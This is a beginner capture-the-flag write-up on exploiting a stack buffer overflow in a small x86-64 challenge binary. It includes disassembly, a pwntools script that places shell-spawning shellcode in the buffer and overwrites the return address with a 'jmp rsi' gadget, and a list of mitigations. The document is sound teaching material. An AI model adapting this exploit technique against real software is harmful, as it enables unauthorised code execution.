title: PWN 101 - A Simple Buffer Overflow Challenge
---

*I recently came across a very simple pwn challenge. I thought it would be a good idea to write a writeup on it to help beginners understand the basics of binary exploitation.*

# Introduction

PWN challenges are a category of cybersecurity problems that involve exploiting vulnerabilities in binary executables. These challenges often require skills in reverse engineering, assembly language, and exploit development. This writeup focuses on a basic buffer overflow vulnerability, a common starting point for learning binary exploitation.

# The Challenge

## Binary Details

- Purpose: Simple input/output program with a vulnerability
- Compilation: No stack protection, executable stack
- Architecture: x86-64
- Security measures: None

## Goal

The goal is to spawn a shell via an executable. 

## Disassembly

The below is the disassembly of the binary:

```asm
Disassembly of section .text:

0000000000401000 <_start>:
  401000:       bf 01 00 00 00          mov    edi,0x1

  401041:       ff e6                   jmp    rsi

0000000000401043 <write>:
  401043:       b8 01 00 00 00          mov    eax,0x1
  401048:       0f 05                   syscall 
  40104a:       c3                      ret    

000000000040104b <read>:

  401057:       bf 00 00 00 00          mov    edi,0x0
  40105c:       48 8d 34 24             lea    rsi,[rsp]
  401060:       ba 10 01 00 00          mov    edx,0x110
  401065:       0f 05                   syscall 
  401067:       48 81 c4 00 01 00 00    add    rsp,0x100
  40106e:       c3                      ret    

000000000040106f <exit>:
  40106f:       b8 3c 00 00 00          mov    eax,0x3c
  401074:       31 ff                   xor    edi,edi
  401076:       0f 05                   syscall 
```

The left column shows the memory address of the instructions, followed by teh machine code in hex, and then the assembly code.

## Program Flow

1. The program first calls `write` and prints `0xd` (13) bytes of data to stdout. Assume it to be "Hello, World" as it's not visible in the disassembly.
2. It then calls `read` and reads `0x110` (272) bytes from stdin.
3. Another `write` call prints the same old message of `0xd` bytes.
4. Finally, it jumps to `0x40106f`, which is the exit syscall.

## The Vulnerability and Exploitation Strategy

As we examine the disassembled code, we discover a discrepancy between the buffer size allocated for reading and the buffer size passed to the `read` syscall. The buffer size is `0x100` bytes, but the buffer size passed to the `read` syscall is `0x110` bytes. This discrepancy creates a buffer overflow condition. 

Now, once this is clear to us, our goal is to craft a payload that:
1. Overflows the buffer
2. Places the shellcode (the code to spawn a shell) in the buffer.
3. Overwrites the return address such that we jump to the shellcode.

We can pass the shellcode as input to the program, but how do we jump to it?

This is a good point to review the function call mechanism in x86-64 assembly: 
1. When a functions is called, the return address is pushed onto the stack.
2. So, `call` instruction is basically equivalent to `push rip + sizeof(call_instruction)` and `jmp` to the function address.
3. When `ret` is executed, the top of the stack is popped into `rip` and the program jumps to that address.
<br/>


How will we procure the address of the buffer (`rsp`) to jump to it?

On closer observation we see that:
- For the read syscall, the `rsi` is passed with the buffer address as per the convention.
- So out shellcode should be in the buffer whose address is passed to `rsi`.
- And, most importantly, there is a `jmp rsi` gadget at `0x401041` so we can jump to the shellcode.

So we can send the address of the `jmp rsi` gadget at an appropriate position in the input and then the return address will be overwritten with the address of the `jmp rsi` gadget. When the control reaches the `ret` instruction, the top of the stack will be the address of the `jmp rsi` gadget we placed in the input. This will cause the program to jump to the shellcode.

Now, let's craft the exploit.


# The Exploit

Here's the Python script to exploit the binary:

Import pwntools and set the context for the shellcode:

```python
from pwn import *

# Set the context for the shellcode
context.arch = 'amd64'
context.os = 'linux'
```

Use pwntools to generate shellcode that spawns a shell. The context we set earlier ensures that the shellcode is compatible with the target architecture and OS.

```python
# Generate a shellcode that spawns a shell
shellcode = asm(shellcraft.sh())
```

```python
# Start the process
p = process('./chall')

# Address of the `jmp rsi` gadget
addr = 0x401041

# Craft the payload
payload = b""
payload += shellcode                             # Our shellcode
payload += b"\x90" * (0x100 - len(shellcode))    # NOP sled
payload += p64(addr)                             # Address of `jmp rsi` gadget
```

The `addr` is placed in the payload such that when contol reaches `ret` instruction the top of the stack will be the address of `jmp rsi` gadget.

```python

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
```

## Explanation of `shellcraft.sh()`:
`shellcraft.sh()` is a pwntools function that generates architecture-specific shellcode to spawn a shell. It's a convenient way to get reliable shellcode without writing it manually.

# Running the Exploit

1. Run it: `python3 exploit.py`
2. If successful, you should get a shell prompt

Example output:
```
$ python3 exploit.py
[+] Starting local process './chall': pid 12345
[*] Switching to interactive mode
$ whoami
user
$ 
```

# Mitigation Techniques

To prevent this type of exploit, developers can:
1. Enable stack protection (e.g., -fstack-protector-all)
2. Implement ASLR (Address Space Layout Randomization)
3. Use non-executable stacks
4. Employ proper bounds checking in code

# Conclusion

This simple PWN challenge demonstrates the basics of buffer overflow exploitation. Key takeaways:
1. Always validate input lengths
2. Use compiler and OS-level protections
3. Understanding assembly and memory layout is crucial for binary exploitation

While this example is simplified for educational purposes, similar vulnerabilities in real-world software can have severe consequences.
